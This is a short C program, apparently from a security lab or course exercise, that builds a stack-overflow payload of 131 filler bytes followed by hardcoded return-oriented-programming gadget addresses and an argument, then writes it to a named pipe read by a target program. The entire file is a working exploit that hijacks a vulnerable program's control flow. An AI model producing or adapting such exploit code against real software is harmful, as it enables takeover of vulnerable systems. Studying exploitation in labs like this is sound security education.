#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[200];

  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
  char add_dl_al[] = "\x07\x46\xbb\xbb";
  char exec_arg[] = "\x8a\x01\x01\x01";

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);

  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, exec_arg);
  strcpy(bufr + 139, xor_eax);
  strcpy(bufr + 143, add_dl_al);
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
